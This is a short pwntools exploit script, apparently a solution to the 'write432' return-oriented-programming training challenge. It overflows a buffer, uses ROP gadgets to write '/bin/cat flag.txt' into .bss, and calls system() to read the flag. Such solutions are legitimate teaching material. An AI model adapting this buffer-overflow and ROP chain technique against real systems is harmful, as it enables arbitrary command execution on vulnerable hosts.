from pwn import *

elf = ELF("./write432")
p = process("./write432")
#p = remote("localhost", 7777 )

payload = b''
payload += b'A'*0x28
payload += b'BBBB'

command = b'/bin/cat flag.txt'
bbs = 0x804a040
for i in range(0,len(command),4):
    payload += p32( 0x80486da ) #pop edi,pop ebp,ret
    payload += p32( bbs+i ) #bss+4i
    payload += command[i:i+4].ljust(4, b'\0' )
    payload += p32( 0x08048670 ) #mov bss, x
    info("%#x <== %s"%(bbs+i, command[i:i+4].ljust(4, b'\0')))

payload += p32( 0x08048430 ) #system
payload += b'CCCC'
payload += p32( bbs ) #bbs->command

p.recvuntil("> ")
p.sendline( payload )

print(p.recv())
